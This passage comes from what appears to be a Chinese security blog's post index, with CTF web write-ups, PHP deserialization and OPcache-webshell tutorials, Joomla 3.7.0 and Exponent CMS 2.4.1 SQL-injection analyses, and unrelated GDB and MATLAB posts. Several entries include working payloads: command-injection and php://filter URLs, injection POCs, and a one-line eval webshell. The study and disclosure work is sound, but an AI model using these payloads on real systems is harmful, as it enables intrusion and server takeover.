      <content type="text"><![CDATA[朋友打比赛，向她（对，女字旁的她）要的web题地址。 WEB-01访问，有一张图片。 查看源代码，发现提示有flag.php。访问后为空白页面。1&lt;img src=&quot;1.jpg&quot; alt=&quot;ͼƬ&quot; /&gt;&lt;!-- flag.php --&gt; 用御剑可以扫出备份文件index.php~，得到源代码如下：12345678910&lt;?php $a=$_GET["file"]; if(!isset($a)) &#123; $a='config'; &#125; @include($a.'.php');echo '&lt;img src="'.$img.'" alt="ͼƬ" /&gt;';?&gt; 参数为file，尝试利用php伪协议去读取flag.php。最后payload：1http://XXXXX/index.php?file=php://filter/read=convert.base64-encode/resource=flag 得到1PD9waHANCiRmbGFnPSdmbGFnezM4Y2FjMGU0OTc0ZTBlOTc2MTQ5MDhmOTAxZTQ1ZmUzfSc7DQo/Pg== base64-decode得到最后flag:123&lt;?php$flag='flag&#123;38cac0e4974e0e97614908f901e45fe3&#125;';?&gt; WEB-02上御剑扫描。发现敏感文件robots.txt。12345User-agent: *Disallow:Disallow: /imagesDisallow: /jsDisallow: /css 在js目录下有flag.txt 访问：1flag&#123;89a7f0eb82a314e5745ec9bc556d06c5&#125; WEB-03题目给了源码1234567891011121314151617181920&lt;?phpif(isset($_REQUEST[ 'ip' ])) &#123; $target = trim($_REQUEST[ 'ip' ]); $substitutions = array( '&amp;' =&gt; '', ';' =&gt; '', '|' =&gt; '', '-' =&gt; '', '$' =&gt; '', '(' =&gt; '', ')' =&gt; '', '`' =&gt; '', '||' =&gt; '', ); $target = str_replace( array_keys( $substitutions ), $substitutions, $target ); $cmd = shell_exec( 'ping -c 4 ' . $target ); echo $target; echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;show_source(__FILE__); 拿DVWA代码改的，简直无力吐槽。 payload1：1http://XXXX:83/index.php?ip=127.0.0.1%0als paylaod2:1http://XXXX:83/index.php?ip=127.0.0.1%0acat flag.php WEB-04题目给了源码：123456789&lt;?phpif( isset( $_REQUEST['ip']) ) &#123; $target = $_REQUEST[ 'ip' ]; $cmd = shell_exec( 'ping -c 4 ' . $target ); echo "&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;";&#125;show_source(__FILE__);?&gt; 没任何过滤，payload1：1http://XXXX:84/index.php?ip=127.0.0.2 | ls payload2：1http://XXXX:84/index.php?ip=127.0.0.1 | cat flag.php flag:1flag&#123;19b55155-f84c-47ef-aeaa-038116de31e5&#125; 小扯两句好吧，这web题的质量，不敢恭维。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[浅谈php反序列化漏洞]]></title>
      <url>%2F2017%2F06%2F17%2F%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
      <content type="text"><![CDATA[php反序列化漏洞，又叫php对象注入漏洞。 序列化与反序列化php中有两个函数serialize() 和unserialize()。 serialize()当在php中创建了一个对象后，可以通过serialize()把这个对象转变成一个字符串，保存对象的值方便之后的传递与使用。测试代码如下；123456789&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class1 = new chybeta;$class1_ser = serialize($class1);print_r($class1_ser);?&gt; 这边我们创建了一个新的对象，并且将其序列化后的结果打印出来：1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;123&quot;;&#125; 这里的O代表存储的是对象（object）,假如你给serialize()传入的是一个数组，那它会变成字母a。7表示对象的名称有7个字符。&quot;chybeta&quot;表示对象的名称。1表示有一个值。{s:4:&quot;test&quot;;s:3:&quot;123&quot;;}中，s表示字符串，4表示该字符串的长度，&quot;test&quot;为字符串的名称，之后的类似。 unserialize()与 serialize() 对应的，unserialize()可以从已存储的表示中创建PHP的值，单就本次所关心的环境而言，可以从序列化后的结果中恢复对象（object）。123456789101112&lt;?phpclass chybeta&#123; var $test = '123';&#125;$class2 = 'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_ser);?&gt; 这里提醒一下，当使用 unserialize() 恢复对象时， 将调用 __wakeup() 成员函数。 反序列化漏洞由前面可以看出，当传给 unserialize() 的参数可控时，我们可以通过传入一个精心构造的序列化字符串，从而控制对象内部的变量甚至是函数。 利用构造函数等Magic functionphp中有一类特殊的方法叫“Magic function”， 这里我们着重关注一下几个： 构造函数__construct()：当对象创建(new)时会自动调用。但在unserialize()时是不会自动调用的。 析构函数__destruct()：当对象被销毁时会自动调用。 __wakeup() ：如前所提，unserialize()时会自动调用。 测试如下：12345678910111213141516171819202122232425&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; echo "__wakeup"; echo "&lt;/br&gt;"; &#125; function __construct()&#123; echo "__construct"; echo "&lt;/br&gt;"; &#125; function __destruct()&#123; echo "__destruct"; echo "&lt;/br&gt;"; &#125;&#125;$class2 = 'O:7:"chybeta":1:&#123;s:4:"test";s:3:"123";&#125;'; print_r($class2);echo "&lt;/br&gt;";$class2_unser = unserialize($class2);print_r($class2_unser);echo "&lt;/br&gt;";?&gt; 利用场景__wakeup() 或__destruct()由前可以看到，unserialize()后会导致__wakeup() 或__destruct()的直接调用，中间无需其他过程。因此最理想的情况就是一些漏洞/危害代码在__wakeup() 或__destruct()中，从而当我们控制序列化字符串时可以去直接触发它们。这里针对 __wakeup() 场景做个实验。假设index源码如下：123456789101112131415161718&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class3 = $_GET['test'];print_r($class3);echo "&lt;/br&gt;";$class3_unser = unserialize($class3);require "shell.php";// 为显示效果，把这个shell.php包含进来?&gt; 同目录下有个空的shell.php文件。一开始访问index.php。 基本的思路是，本地搭建好环境，通过 serialize() 得到我们要的序列化字符串，之后再传进去。通过源代码知，把对象中的test值赋为 “&lt;?php phpinfo(); ?&gt;”,再调用unserialize()时会通过__wakeup()把test的写入到shell.php中。为此我们写个php脚本：123456789101112&lt;?phpclass chybeta&#123; var $test = '123'; function __wakeup()&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$this-&gt;test); fclose($fp); &#125;&#125;$class4 = new chybeta();$class4-&gt;test = "&lt;?php phpinfo(); ?&gt;"; $class4_ser = serialize($class4); print_r($class4_ser);?&gt; 由此得到序列化结果：1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;s:19:&quot;&lt;?php phpinfo(); ?&gt;&quot;;&#125; 其他Magic function的利用但如果一次unserialize()中并不会直接调用的魔术函数，比如前面提到的__construct()，是不是就没有利用价值呢？非也。类似于PWN中的ROP，有时候反序列化一个对象时，由它调用的__wakeup()中又去调用了其他的对象，由此可以溯源而上，利用一次次的“gadget”找到漏洞点。123456789101112131415161718192021222324&lt;?phpclass ph0en1x&#123; function __construct($test)&#123; $fp = fopen("shell.php","w") ; fwrite($fp,$test); fclose($fp); &#125;&#125;class chybeta&#123; var $test = '123'; function __wakeup()&#123; $obj = new ph0en1x($this-&gt;test); &#125;&#125;$class5 = $_GET['test'];print_r($class5);echo "&lt;/br&gt;";$class5_unser = unserialize($class5);require "shell.php";?&gt; 这里我们给test传入构造好的序列化字符串后，进行反序列化时自动调用 __wakeup()函数，从而在new ph0en1x()会自动调用对象ph0en1x中的__construct()方法，从而把&lt;?php phpinfo() ?&gt;写入到 shell.php中。 利用普通成员方法前面谈到的利用都是基于“自动调用”的magic function。但当漏洞/危险代码存在类的普通方法中，就不能指望通过“自动调用”来达到目的了。这时的利用方法如下，寻找相同的函数名，把敏感函数和类联系在一起。12345678910111213141516171819202122232425262728293031&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en1x(); &#125; function __destruct() &#123; $this-&gt;test-&gt;action(); &#125;&#125;class ph0en1x &#123; function action() &#123; echo "ph0en1x"; &#125;&#125;class ph0en2x &#123; var $test2; function action() &#123; eval($this-&gt;test2); &#125;&#125;$class6 = new chybeta();unserialize($_GET['test']);?&gt; 本意上，new一个新的chybeta对象后，调用__construct()，其中又new了ph0en1x对象。在结束后会调用__destruct()，其中会调用action()，从而输出 ph0en1x。 下面是利用过程。构造序列化。123456789101112131415&lt;?phpclass chybeta &#123; var $test; function __construct() &#123; $this-&gt;test = new ph0en2x(); &#125;&#125;class ph0en2x &#123; var $test2 = &quot;phpinfo();&quot;;&#125;echo serialize(new chybeta());?&gt; 得到：1O:7:&quot;chybeta&quot;:1:&#123;s:4:&quot;test&quot;;O:7:&quot;ph0en2x&quot;:1:&#123;s:5:&quot;test2&quot;;s:10:&quot;phpinfo();&quot;;&#125;&#125; 传给index.php的test参数，利用成功：]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2017-8917]Joomla! 3.7.0 SQL Injection分析]]></title>
      <url>%2F2017%2F05%2F19%2FCVE-2017-8917-Joomla-3-7-0-SQL-Injection%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[Joomla!3.7.0 Core SQL注入漏洞. POC这次干脆先放出poc吧。12345http://localhost:2500/Joomla370/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml(1,concat(0x3e,database()),0) 这次根据参数的传入流程来进行分析。 漏洞危害组件3.7.0版本中出现了com_field组件,无需授权即可访问。查看...\components\com_fields\controller.php，在第27行左右，其相关代码如下：12345678910111213141516public function __construct($config = array()) &#123; $this-&gt;input = JFactory::getApplication()-&gt;input; // Frontpage Editor Fields Button proxying: if ($this-&gt;input-&gt;get('view') === 'fields' &amp;&amp; $this-&gt;input-&gt;get('layout') === 'modal') &#123; // Load the backend language file. $lang = JFactory::getLanguage(); $lang-&gt;load('com_fields', JPATH_ADMINISTRATOR); $config['base_path'] = JPATH_COMPONENT_ADMINISTRATOR; &#125; parent::__construct($config); &#125; 可以看到它先判断通过view是否等于fields,layout是否等于modal,而这两个参数都是我们可控的。若满足则将会加载JPATH_ADMINISTRATOR中的com_fields组件，并且将base_path设置为 JPATH_COMPONENT_ADMINISTRATOR，之后调用父类的构造方法。 传入sql语句在调用父类构造方法后，一路运行到...\Joomla370\libraries\legacy\controller\legacy.php中，约莫707行，这时会通过$this-&gt;$doTask调用display()函数。 跟进display()函数，它位于 ...\Joomla370\libraries\legacy\controller\legacy.php，接着运行至legacy.php的约莫671行左右，调用了视图（view）的display()函数。我们跟进一下，跳转进入...\Joomla370\administrator\components\com_fields\views\fields\view.html.php， 此时运行到，下面这条语句，给get()传入的参数为State 1$this-&gt;state = $this-&gt;get('State'); 我们跟进这个get()函数，一直运行到422行， 之后将会调用 getState()，跟进，进入...\Joomla370\libraries\legacy\model\legacy.php 之后会调用filedsModel类中的populateState()，跟进后会发现调用其父类的populateState()函数，其定义在 ...\Joomla370\libraries\legacy\model\list.php中，约莫在第495行，相关代码如下：12345..省略..if ($list = $app-&gt;getUserStateFromRequest($this-&gt;context . '.list', 'list', array(), 'array'))..省略.. 这里我们先跟进一下getUserStateFromRequest()，它的定义在...\Joomla370\libraries\cms\application\cms.php中，在该函数结束后，它获取了我们通过get方法传入的参数，也就是说，我们成功的控制了fullordering的值。 在该函数运行完后，流程将会回到前面的那个定义在...\Joomla370\libraries\cms\application\cms.php中的populateState()函数。此时运行的代码如下：12345678910foreach ($list as $name =&gt; $value)&#123; // Exclude if blacklisted if (!in_array($name, $this-&gt;listBlacklist)) &#123; // Extra validations switch ($name)&#123;...&#125; $this-&gt;setState('list.' . $name, $value); &#125;&#125; 如果数组的key不在黑名单（blacklisted）中，将会为$list变量根据相应的State进行注册，在这部分函数运行到结束部分，可以看见成功的控制了list数组的fullordering的值。 查看变量，如下： 注入过程接下来继续运行，一直运行回到Joomla370\administrator\components\com_fields\views\fields\view.html.php中的display()函数中。 跟进这一行 $this-&gt;get(&#39;Items&#39;);，进入...\Joomla370\libraries\legacy\view\legacy.php，约莫在422行,这里的行为跟前面分析类似，此后将会调用getitem()： 继续跟进，进入...\Joomla370\libraries\legacy\model\list.php，约莫在186行：12345try &#123; // Load the list items and add the items to the internal cache. $this-&gt;cache[$store] = $this-&gt;_getList($this-&gt;_getListQuery(), $this-&gt;getStart(), $this-&gt;getState('list.limit')); &#125; 通过_getList调用了_getListQuery,继续跟进，进入...\Joomla370\libraries\legacy\model\list.php，约莫在 132行，12345if ($lastStoreId != $currentStoreId || empty($this-&gt;query))&#123; $lastStoreId = $currentStoreId; $this-&gt;query = $this-&gt;getListQuery();&#125; 调用了 getListQuery()，继续跟进，进入 ...\Joomla370\administrator\components\com_fields\models\fields.php,一直运行到约莫在 305 行，调用getState方法，传入list.fullordering参数。相关代码如下： 查看变量表： 之后在第314行，将$listOrdering带入查询，相关代码如下：1$query-&gt;order($db-&gt;escape($listOrdering) . ' ' . $db-&gt;escape($orderDirn)); 在进行$query-&gt;order之前，会先进行一次过滤，跟进$db-&gt;escape，进入...\Joomla370\libraries\joomla\database\driver\mysqli.php，约莫242行，相关代码如下：12345678910111213public function escape($text, $extra = false) &#123; $this-&gt;connect(); $result = mysqli_real_escape_string($this-&gt;getConnection(), $text); if ($extra) &#123; $result = addcslashes($result, '%_'); &#125; return $result; &#125; 对于传入的$text通过mysqli_real_escape_string()进行过滤，只转义了一些字符。因此可以通过构造进行成功的注入。 成功注入]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[一次水水的调试]]></title>
      <url>%2F2017%2F05%2F16%2F%E4%B8%80%E6%AC%A1%E7%AE%80%E5%8D%95%E7%9A%84GDB%E8%B0%83%E8%AF%95%2F</url>
      <content type="text"><![CDATA[Linux 作业… 编译1gcc -g -O0 array.c main.c -o test 调试1gdb test 通过list命令，可以显示出部分源代码，我们选择在源代码的第9行处下断点。 通过print命令，可以查看变量的值，因为数组名已知，可以如下打印出数组的内容。可以发现，在还没有初始化或者赋值前，数组内容是随机化（或者说是垃圾数据）。 此时程序运行到第9行附近，可以再次通过list命令显示其附近的源代码。 这里为了方便，我们在第11，12，15行下下断点，分别对应两个array_fill_with() 函数 和 array_add()函数。 接下来单步调试，命令是 1gdb-peda$ n 此时在执行完第11行的array_fill_with(),即已经完成了对数组vector_a的赋值后，我们查看下三个数组的值。 数组vector_a全被赋值为10在意料之中（0xa == 10 ），但注意数组vector_b的第一个元素也被赋值为0xa了。在前面可知，数组vector_b的第一个元素原本是0xff00。所以这边可能产生了一个越界。 下一条语句是对数组vector_b进行赋值，这次我们选择进入函数array_fill_with()，即进行step into，gdb中相应的命令为：1gdb-peda$ s 由上图，通过list命令，可知我们已经进入到了array.c中的第七行，正在进行一个循环。其中变量length的值为0x10，即为16。 我们知道，在C语言中，数组下标是从0开始的，这里也就解释了为什么我们再对数组vector_a赋值完后，数组vector_b的第一个元素也被改变了。 接下来我们继续运行程序，命令为：1gdb-peda$ c 此时，已经完成了对数组vector_b的赋值，我们可以推测数组vector_c的第一个元素也会被从原先的 0x0 改为 0x37。事实证明，推测是正确的，见下图： Bug其实重点就一个，C语言中数组下标从0开始的。把array.c中的i &lt;= length 改为 i &lt; length就ok啦。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[利用PHP的OPcache机制getshell]]></title>
      <url>%2F2017%2F05%2F13%2F%E5%88%A9%E7%94%A8PHP%E7%9A%84OPcache%E6%9C%BA%E5%88%B6getshell%2F</url>
      <content type="text"><![CDATA[OPcache扩展在PHP5.5.0版本后中已经绑定了，它可以把PHP脚本预编译的字节码存放到缓存中，从而提高性能，加速访问。同时也可以利用它来进行getshell。本文是对 《binary-webshell-through-opcache-in-php-7》一文的测试。 关于OPcache在我们指定了一个缓存目录（后面提到）后，php会把编译好的php字节码文件放到这个缓存目录中。这里假设该缓存目录是/var/www/html/opcache，未访问前，opcache文件夹为空。接下去我去访问 index.php后，php会在 opcache文件夹中创建一个名为md5哈希值的文件夹，其下的目录结构和 index.php所在目录结构相同，同时生成了 index.php.bin。 这个index.php.bin 就是 index.php 的缓存文件。并且作为www-data用户，我们对 5672f68788bcb25b11403b33f5d1497f 具有读写执行权限。这样，我们想办法把这个index.php.bin替换为包含有恶意代码的index.php.bin文件，当我们再次去访问index.php时，php会选择加载这个缓存文件，从而我们达到了getshell的目的。这个思路，感觉跟二进制漏洞中的GOT覆写技术有点神似吧。 环境配置php版本12345root@4db5ba2ab3bf:/var/www/html# php -vPHP 7.0.15-0ubuntu0.16.04.4 (cli) ( NTS )Copyright (c) 1997-2017 The PHP GroupZend Engine v3.0.0, Copyright (c) 1998-2017 Zend Technologies with Zend OPcache v7.0.15-0ubuntu0.16.04.4, Copyright (c) 1999-2017, by Zend Technologies 配置OPcache开启OPcache在php配置文件 php.ini 的约莫 1745 行左右，找到如下配置：1;opcache.enable=0 去掉前面的分号;，将0改为1，如下：1opcache.enable=1 关闭时间戳验证1;opcache.validate_timestamps=1 修改为1opcache.validate_timestamps=0 设置OPcache缓存路径继续向下翻，找到如下配置：1;opcache.file_cache= 这里我修改后的配置是：1opcache.file_cache= &quot;/var/www/html/opcache&quot; 设置缓存文件优先级1;opcache.file_cache_only=0 修改为1opcache.file_cache_only=1 重启apache这里我以apache作为web服务器。1service apache2 resart 重启，使前面修改的php.ini生效 www目录index.php12345678910111213&lt;html&gt; &lt;body&gt; &lt;form action="upload-file.php" method="post" enctype="multipart/form-data"&gt; &lt;label for="file"&gt;filename:&lt;/label&gt; &lt;input type="file" name="file" id="file" /&gt; &lt;br/&gt; &lt;label for="filepath"&gt;filepath:&lt;/label&gt; &lt;input type="text" name="filepath" id="filepath" /&gt; &lt;br/&gt; &lt;input type="submit" name="submit" value="submit" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; upload-file.php12345678&lt;?php $path = $_POST['filepath']; echo "filename: " . $_FILES["file"]["name"] . "&lt;br /&gt;"; echo "type: " . $_FILES["file"]["type"] . "&lt;br /&gt;"; echo "size: " . ($_FILES["file"]["size"] / 1024) . " Kb&lt;br /&gt;"; move_uploaded_file($_FILES["file"]["tmp_name"], $path . $_FILES["file"]["name"]); echo "save : " . $path . $_FILES["file"]["name"]; ?&gt; 那个。。代码写得很丑。。仅为测试之用：） phpinfo.php123&lt;?php phpinfo();?&gt; getshell现在开始黑盒测试。。 利用phpinfo获取信息 可知，OPcache缓存路径在 /var/www/html/opcache 中。且服务器端开启了 opcache.file_cache_only,禁用了opcache.validate_timestamps。 这是能成功利用的条件。 php7-opcache-override.py由前可知，在对缓存文件进行操作前，需要经过一个名称是md5哈希值的文件夹。这可以通过 hp7-opcache-override.py 来计算。 得到这个文件夹名为：5672f68788bcb25b11403b33f5d1497f 构建恶意的缓存文件恶意的缓存文件得先本地生成，然后通过各种方式比如上传等去覆盖服务器上的缓存文件。我们先在本地配置好OPcache，这样才能生成缓存文件。然后本地新建一个 index.php,内容是一句话木马&lt;?php @eval($_POST[test]);?&gt;，之后访问它。在对应的缓存文件夹里可以看到index.php.bin用十六进制编辑器打开，将OPCACHE.后的那串md5哈希值，替换为前一步骤得到的哈希值：5672f68788bcb25b11403b33f5d1497f ,修改后如下： 覆盖原缓存文件在覆盖之前，先看看服务器上的原缓存文件长啥样： 这里利用上传来进行覆盖。访问index.php,选择修改后的index.php.bin进行上传，上传路径为要覆盖的缓存文件的相对地址 opcache/5672f68788bcb25b11403b33f5d1497f/var/www/html/。 上传完成后，服务器上的缓存文件已经替换成我们构造的恶意文件了。 菜刀连上此时再去访问 index.php,发现已经被修改了，不再是上传的页面。用菜刀连上，密码是 test 。成功getshell。 CTF前面我们是通过上传来实现覆盖，但实际利用起来肯定没那么简单。利用OPcache来获得webshell的姿势一般都会和其他姿势相结合。比如下面两题CTF题 ASIS CTF 2016 – BinaryCloud这题是通过上传来覆盖，但后端有各种过滤。附上writeup ALICTF 2016 - homework这题利用sql注入的dumpfile来实现对缓存文件的覆盖。附上writeup （Author:chybeta）]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[[CVE-2017-7991]Exponent CMS 2.4.1 SQL Injection分析]]></title>
      <url>%2F2017%2F05%2F12%2FCVE-2017-7991-Exponent-CMS-2-4-1-SQL-Injection%E5%88%86%E6%9E%90%2F</url>
      <content type="text"><![CDATA[Exponent CMS是一款开源的CMS，其2.4.1版中存在sql注入 漏洞注入点在 /framework/modules/eaas/controllers/eaasController.php 中。如下： 12345678910111213141516171819202122public function api() &#123; if (empty($this-&gt;params['apikey'])) &#123; $_REQUEST['apikey'] = true; // set this to force an ajax reply $ar = new expAjaxReply(550, 'Permission Denied', 'You need an API key in order to access Exponent as a Service', null); $ar-&gt;send(); //FIXME this doesn't seem to work correctly in this scenario &#125; else &#123; $key = expUnserialize(base64_decode(urldecode($this-&gt;params['apikey']))); $cfg = new expConfig($key); $this-&gt;config = $cfg-&gt;config; if(empty($cfg-&gt;id)) &#123; $ar = new expAjaxReply(550, 'Permission Denied', 'Incorrect API key or Exponent as a Service module configuration missing', null); $ar-&gt;send(); &#125; else &#123; if (!empty($this-&gt;params['get'])) &#123; $this-&gt;handleRequest(); &#125; else &#123; $ar = new expAjaxReply(200, 'ok', 'Your API key is working, no data requested', null); $ar-&gt;send(); &#125; &#125; &#125;&#125; api()中，先检测参数apikey 是否为空，若不为空，则进入else分支。在分支中，先对参数apikey进行一次urldecode,接着进行 base64_decode,最后进行一次反序列化expUnserialize，在expUnserialize中存在一次小小的过滤：1234567891011121314function expUnserialize($serial_str) &#123; if ($serial_str === 'Array') return null; // empty array string?? if (is_array($serial_str) || is_object($serial_str)) return $serial_str; // already unserialized// $out1 = @preg_replace('!s:(\d+):"(.*?)";!se', "'s:'.strlen('$2').':\"$2\";'", $serial_str ); $out = preg_replace_callback( '!s:(\d+):"(.*?)";!s', create_function ('$m', '$m_new = str_replace(\'"\',\'\"\',$m[2]); return "s:".strlen($m_new).\':"\'.$m_new.\'";\';' ), $serial_str );// if ($out1 !== $out) &#123;// eDebug('problem:&lt;br&gt;'.$out.'&lt;br&gt;'.$out1);// &#125; 它会把 经过base64_decode后的$apikey 中的双引号加上斜杠。但是对于单引号，它没有进行处理。在进行expUnserialize之后，赋值给$key，并在之后实例化一个 expConfig对象。expConfig部分代码如下： 12345678910111213class expConfig extends expRecord &#123; protected $table = 'expConfigs'; function __construct($params=null) &#123; global $db; if (!is_array($params)) &#123; $this-&gt;location_data = serialize($params); parent::__construct($db-&gt;selectValue($this-&gt;table, 'id', "location_data='".$this-&gt;location_data."'")); &#125; else &#123; parent::__construct($params); &#125; .... 在 framysqli\core\subsystems\database\mysqli.php 中，可以看到关于selectValue的定义： 123456789101112131415function selectValue($table, $col, $where=null) &#123; if ($where == null) $where = "1"; $sql = "SELECT " . $col . " FROM `" . $this-&gt;prefix . "$table` WHERE $where LIMIT 0,1"; $res = @mysqli_query($this-&gt;connection, $sql); if ($res == null) return null; $obj = mysqli_fetch_object($res); if (is_object($obj)) &#123; return $obj-&gt;$col; &#125; else &#123; return null; &#125;&#125; 可以看到，在检查完$params是否是数组后，将我们传入的$params序列化后直接插入到了数据库查询语句中,未作任何过滤和检测。加上之前并未对单引号进行处理，因此我们可以利用单引号，对 location_data=&#39;&quot;.$this-&gt;location_data.&quot;&#39; 中的单引号进行闭合。 POC1234http://localhost:2500/exponent241/index.php?module=eaas&amp;action=api&amp;apikey=czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7 其中 base64_decode(“czoxNjoiYWFhJ29yIHNsZWVwKDIpIyI7”) = s:16:”aaa’or “‘sleep(2)# 查看 mysql.log ，可以发现成功注入。运行的 sql语句 为： 1SELECT id FROM `exponent_expConfigs` WHERE location_data=&apos;s:19:&quot;aaa&apos;or \&quot;&apos;sleep(2)#&quot;;&apos; LIMIT 0,1 可以看到单引号被成功闭合。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[三次样条插值之MATLAB实现]]></title>
      <url>%2F2017%2F04%2F09%2F%E4%B8%89%E6%AC%A1%E6%A0%B7%E6%9D%A1%E6%8F%92%E5%80%BC%E4%B9%8BMATLAB%E5%AE%9E%E7%8E%B0%2F</url>
      <content type="text"><![CDATA[三次样条插值之MATLAB实现 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475clear allx = input('输入横坐标，格式:[x1 x2 …… xn]\n')y = input('输入纵坐标，格式:[y1 y2 …… yn]\n')n = length(x);flag = input('请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :');if flag == 1 y1_deri = input('x1 的 一阶导数值：'); yn_deri = input('xn 的 一阶导数值：');else y1_deri = input('x1 的 二阶导数值：'); yn_deri = input('xn 的 二阶导数值：');endfor i = 1 : n-1 h(i) = x(i+1) - x(i);endfprintf('计算 h 结果为:\n');hfor i = 2 : n-1 u(i-1) = h(i-1) / (h(i-1) + h(i)); lamda(i) = h(i) / (h(i-1) + h(i));endif flag == 1 u(n-1) = 1; lamda(1) = 1;else u(n-1) = 0; lamda(1) = 0;endfprintf('计算 μ 结果为: \n');ufprintf('计算 λ 结果为：\n');lamdafor i = 2 : n-1 d(i) = 6 * ((y(i+1)-y(i))/(x(i+1)-x(i)) - (y(i) - y(i-1))/( x(i) - x(i-1)))/(h(i-1)+h(i));endif flag == 1 d(1) = 6 / h(1) * (( y(2)-y(1) )/( x(2) - x(1) ) - y1_deri); d(n) = 6 / h(n-1) * (yn_deri - ((y(n) - y(n-1)) / ( x(n) - x(n-1))));else d(1) = 2 * y1_deri; d(n) = 2 * yn_deri;endfprintf('计算 d 的结果：\n');dmatrix1 = zeros(n,n);for i = 1 : n-1 matrix1(i,i) = 2; matrix1(i,i+1) = lamda(i); matrix1(i+1,i) = u(i);endmatrix1(n,n) = 2;matrix1;fprintf('求得 M 结果:\n');M = matrix1\d'for i = 1 : n-1 clear S syms t k = x(i):0.001:x(i+1); fprintf('区间为[ %.3f : %.3f]\n',x(i),x(i+1)); S = M(i)*(x(i+1)-t)^3/ (6*h(i)) + M(i+1)*(t - x(i))^3/(6*h(i))+(y(i) - M(i)*h(i)^2/6)*(x(i+1) - t)/h(i) + (y(i+1) - M(i+1)*h(i)^2/6)*(t - x(i))/h(i) s = M(i)*(x(i+1)-k).^3/ (6*h(i)) + M(i+1)*(k - x(i)).^3/(6*h(i))+(y(i) - M(i)*h(i)^2/6)*(x(i+1) - k)/h(i) + (y(i+1) - M(i+1)*h(i)^2/6)*(k - x(i))/h(i); hold on; plot(k,s);end Result测试例题：《计算方法》（李庆扬版）P44 例71234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&gt;&gt; sanciyangtiao输入横坐标，格式:[x1 x2 …… xn][27.7 28 29 30]x = 27.7000 28.0000 29.0000 30.0000输入纵坐标，格式:[y1 y2 …… yn][4.1 4.3 4.1 3.0]y = 4.1000 4.3000 4.1000 3.0000请选择边界条件：①已知两端一阶导数值，②已知两端二阶导数值。选择 1 or 2 :1x1 的 一阶导数值：3.0xn 的 一阶导数值：-4.0计算 h 结果为:h = 0.3000 1.0000 1.0000计算 μ 结果为:u = 0.2308 0.5000 1.0000计算 λ 结果为：lamda = 1.0000 0.7692 0.5000计算 d 的结果：d = -46.6667 -4.0000 -2.7000 -17.4000求得 M 结果:M = -23.5314 0.3960 0.8297 -9.1149区间为[ 27.700 : 28.000]S =(35650*(t - 28)^3)/2727 - (107*t)/202 + (200*(t - 277/10)^3)/909 + 19317/1010区间为[ 28.000 : 29.000]S =(419*(t - 28)^3)/3030 - (55*t)/202 - (20*(t - 29)^3)/303 + 35929/3030区间为[ 29.000 : 30.000]S =(563*t)/1010 - (4603*(t - 29)^3)/3030 - (419*(t - 30)^3)/3030 - 36977/3030]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:random]]></title>
      <url>%2F2017%2F04%2F09%2FPwnable-kr-random%2F</url>
      <content type="text"><![CDATA[伪随机 random先file看一下 IDA打开 可以看到程序读入 v4 ，跟 v5 进行异或操作，若结果为 0xDEADBEEF ，则可以读取到flag。其中 v5的初始值由 rand（）指定。 rand（）rand（）产生伪随机数。伪随机数的“随机”之处是它的种子（seed）。种子确定后，按照一定算法所计算出来的随机数序列也就完全确定了。 C语言中，可以通过 srand() 来指定种子（seed）。如果用户在调用 rand（）之前没有调用过 srand（），则系统默认种子为 1 。测试如下： 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main(int argc, char const *argv[])&#123; unsigned int random1; random1 = rand(); printf("No srand():\n"); printf("random1 = %u\n", random1); unsigned int random2; srand(1); random2 = rand(); printf("srand(1):\n"); printf("random2 = %u\n", random2); unsigned int random3; srand(2); random3 = rand(); printf("srand(2):\n"); printf("random3 = %u\n", random3); return 0;&#125; Exp由以上分析可知，v5的值其实是确定的，为 1804289383。而判断条件(v5 ^ v4) == 0xDEADBEEF 等价于 v4 == 0xDEADBEEF ^ v5 。运算可得 1804289383 ^ 0xDEADBEEF = 3039230856。所以我们要给 v4 传入 3039230856 。 1234random@ubuntu:~$ ./random3039230856 Good!Mommy, I thought libc random is unpredictable... FLAG: Mommy, I thought libc random is unpredictable…]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[Pwnable.kr:passcode]]></title>
      <url>%2F2017%2F04%2F08%2FPwnable-kr-passcode%2F</url>
